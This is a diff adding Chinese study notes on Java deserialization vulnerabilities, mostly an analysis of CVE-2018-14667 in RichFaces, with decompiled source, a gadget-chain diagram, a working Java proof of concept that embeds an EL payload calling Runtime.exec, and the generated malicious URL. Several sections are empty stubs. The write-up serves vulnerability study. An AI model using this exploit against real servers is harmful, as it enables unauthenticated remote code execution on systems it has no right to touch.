@@ -652,3 +652,268 @@ EL表达式获取`<object>`对象中`<name>`字段的方式有以下两种，其
 ```
 
 ？？？？？？？？？？？？？？？？？？？？TODO：
+
+
+
+
+
+
+
+
+
+
+
+
+
+# §3 反序列化
+
+在Java中，序列化由`ObjectOutputStream`类的`writeObject()`方法实现，反序列化由`ObjectInputStream`的`readObject()`实现。被序列化的的类必须实现`Serializable`接口或其子类`Externalizable`接口。
+
+反序列化漏洞必须同时满足两个条件：存在利用链、存在触发点。
+
+### §3.1 Apache系列反序列化漏洞原理
+
+
+
+
+
+
+
+
+
+### §3.2 FastJson反序列化漏洞原理
+
+FastJson反序列化使用的是自定义的一套流程。
+
+```mermaid
+flowchart LR
+	Version1.2.24["1.2.24"]
+		-->Version1.2.41["1.2.41"]
+		-->Version1.2.42["1.2.42"]
+		-->Version1.2.45["1.2.45"]
+		-->Version1.2.47["1.2.47"]
+		-->Version1.2.68["1.2.68"]
+	Version1.2.24.->FirstBug["第一次被发现反序列化漏洞"]
+	Version1.2.41.->BlackListBypassBug1["黑名单绕过漏洞"]
+	Version1.2.42.->BlackListBypassBug2["黑名单绕过漏洞"]
+	Version1.2.45.->GadgetChain["新利用链"]
+	Version1.2.47.->AutoTypeBypass1["AutoType绕过"]
+	Version1.2.68.->AutoTypeBypass2["AutoType绕过"]
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+# ??? CVE-2018-14667 RichFaces 反序列化RCE
+
+# 0x01 前情提要
+
+`RichFaces`框架集成了一系列支持Ajax的UI组件。
+
+
+
+
+
+
+
+
+
+根据[cve.org](https://www.cve.org/CVERecord?id=CVE-2018-14667)的介绍，CVE-2018-14667是由于`RichFaces`框架在[3.0,3.3.4]版本内解析EL表达式而造成的远程代码执行漏洞。
+
+> The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression Language (EL) injection via the UserResource resource. A remote, unauthenticated attacker could exploit this to execute arbitrary code using a chain of java serialized objects via org.ajax4jsf.resource.UserResource$UriData.
+
+# 0x02 配置环境
+
+> 注意：RichFaces在2016年6月迎来了最后一次更新，最终版本停留在了`4.5.17.final`。虽然其官网在Redhat的赞助下仍能正常访问，但是下载页面的`Release Note`链接已经404。观察最新版本的下载链接`http://downloads.jboss.org/richfaces/releases/3.3.X/3.3.4.Final/darkX-3.3.4.Final.jar`，可以大致推测其他版本的路径。
+
+# 0x03 分析
+
+官网说引起反序列化的类为`org.ajax4jsf.resource.UserResource$UriData`，我们先定位到此处：
+
+```java
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package org.ajax4jsf.resource;
+
+import java.io.IOException;
+import java.io.OutputStream;
+import java.io.Serializable;
+import java.util.Date;
+import javax.el.ELContext;
+import javax.el.MethodExpression;
+import javax.el.ValueExpression;
+import javax.faces.component.UIComponent;
+import javax.faces.component.UIComponentBase;
+import javax.faces.context.FacesContext;
+
+public class UserResource extends InternetResourceBase 
+
+    public Object getDataToStore(FacesContext context, Object data) {
+        UriData dataToStore = null;
+        if (data instanceof ResourceComponent2) {
+            ResourceComponent2 resource = (ResourceComponent2)data;
+            dataToStore = new UriData();
+            dataToStore.value = resource.getValue();
+            dataToStore.createContent = UIComponentBase.saveAttachedState(context, resource.getCreateContentExpression());
+            if (data instanceof UIComponent) {
+                UIComponent component = (UIComponent)data;
+                ValueExpression expires = component.getValueExpression("expires");
+                if (null != expires) {
+                    dataToStore.expires = UIComponentBase.saveAttachedState(context, expires);
+                }
+
+                ValueExpression lastModified = component.getValueExpression("lastModified");
+                if (null != lastModified) {
+                    dataToStore.modified = UIComponentBase.saveAttachedState(context, lastModified);
+                }
+            }
+        }
+
+        return dataToStore;
+    }
+
+    public void send(ResourceContext context) throws IOException {
+        UriData data = (UriData)this.restoreData(context);
+        FacesContext facesContext = FacesContext.getCurrentInstance();
+        if (null != data && null != facesContext) {
+            ELContext elContext = facesContext.getELContext();
+            OutputStream out = context.getOutputStream();
+            MethodExpression send = (MethodExpression)UIComponentBase.restoreAttachedState(facesContext, data.createContent);
+            send.invoke(elContext, new Object[]{out, data.value});
+
+            try {
+                out.flush();
+                out.close();
+            } catch (IOException var8) {
+            }
+        }
+
+    }
+
+	// ...
+
+    public static class UriData implements Serializable {
+        private static final long serialVersionUID = 1258987L;
+        private Object value;
+        private Object createContent;
+        private Object expires;
+        private Object modified;
+
+        public UriData() {
+        }
+    }
+}
+
+```
+
+利用链如下：
+
+```mermaid
+flowchart LR
+	subgraph org.ajax4jsf.webapp.BaseFilter
+		doFilter["doFilter()"]
+	end
+	subgraph org.ajax4jsf.resource.InternetResourceService
+		serviceResource["serviceResource()"]
+	end
+	subgraph java.io.ObjectInputStream
+		readObject["readObject()"]
+	end
+	subgraph org.ajax4jsf.resource.ResourceLifeCycle
+		sendResource["sendResource()"]
+	end
+	subgraph org.ajax4jsf.resource.ResourceBuilderImpl
+		getResourceForKey["getResourceForKey()"]
+		decrypt["decrypt()"]
+		createUserResource["createUserResource()"]
+	end
+	subgraph org.ajax4jsf.resource.UserResource
+		send["send()"]
+	end
+	subgraph javax.faces.component.StateHolderSaver
+		restore["restore()"]
+	end
+	subgraph org.jboss.al.MethodExpressionImpl
+		invoke["invoke()"]
+	end
+	doFilter-->serviceResource
+		-->getResourceForKey
+		-->decrypt
+		-->readObject
+		-->sendResource
+		-->createUserResource
+		-->send
+		-->restore
+		-->invoke
+```
+
+Poc：
+
+```java
+public class CVE_2018_14667{
+    private static Codec codec = new Codec();
+    protected static byte[] encrypt(byte[] src){
+        try {
+            Deflater compressor = new Deflater(1);
+            byte[] compressed = new byte[src.length + 100];
+            compressor.setInput(src);
+            compressor.finish();
+            int totalOut = compressor.deflate(compressed);
+            byte[] zipsrc = new byte[totalOut];
+            System.arraycopy(compressed,0,zipsrc,0,totalOut);
+            compressor.end();
+            return codec.encode(zipsrc);
+        } catch(Exception e) {
+			throw new FacesException("Can't encode resource data",e);
+		}
+	}
+            
+	public static void main(String[] args) throws ClassNotFoundException, IOException {
+        String poc =
+            "#{request.getClass.getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")}";
+		Class targetClass = Class.forName("org.ajax4jsf.resource.UserResource$UriData");
+		Constructor constructor = targetClass.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+		Object object = constructor.newInstance();
+		Class[] arg = new Class[]{javax.el.MethodExpression.class};
+		MethodExpressionImpl methodExpression = new MethodExpressionImpl(poc,null,null,null,null,arg);
+		StateHolderSaver exp = new StateHolderSaver(null,methodExpression);
+		Reflections.setFiled(object,"createContent",exp);
+		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+		ObjectOutput output = new ObjectOutputStream(byteArrayOutputStream);
+		output.writeObject(object); 
+		byte[] result = encrypt(byteArrayOutputStream.toByteArray());
+		System.out.println("/"+ new String(result, StandardCharsets.UTF_8) + ".jsf");	
+	}
+}
+```
+
+得到恶意URL：
+
+```
+http://127.0.0.1:80/a4j/s/3_3_0.GAorg.ajax4jsf.resource.UserResource/n/s/-1487394660/DATA/eAF9kb9rFEEUx18Ogz9iCj0wWKTIKnJnMddolVhFMcKeQpYIJtW72XfnrLMzczOzl8VDuzRpLNLa2SaVf4GtYJP!wCoEEYJg7-zukSCIU82b-c7nfd93Dn!CvLNwX9sRwwzLB5kbMktOF5YT23JkN2fF3S0rHqNHqFb74Y8WXIphkVtCT-taeVLew804wwn2JKpR78UgI-5XY7hMpRGBOYb3MBfDlVynYigondXzE5QF1UVpgpd7FaJkQ-TkGNe50SqwWeJDow0tU7IJTsi--vr50cHHb!0WtGK4yiU69xxz-ttD4q1Qo-Dhmgtv0prh4VbjUuheQlagFG9xIGm1NFX7lSqKbKCdYyRZn!xrnT4pTfDvhFbPciMHZ0u!F77c6F8HKC3cbuz-QzuOlxa2P3w!a9W69rnugvZpbz!5tX28VinM7hR270wtjQtyno3Ir1czdbrn21hjGD4cyLBpLqMKyqq42WahvMgpqvWN7U4UKBfnQk30G-qoQsouo5J4J-IoedR9B1BYaO!UsTS0WXBHxy9PTpenT2uD4d!n!H!mNSYkaP4ALHfPHA__.jsf
+```
+
+
+
+
+
+
+
+
+
+
+
+6月23日第一次重新开始编辑时为2w+字。
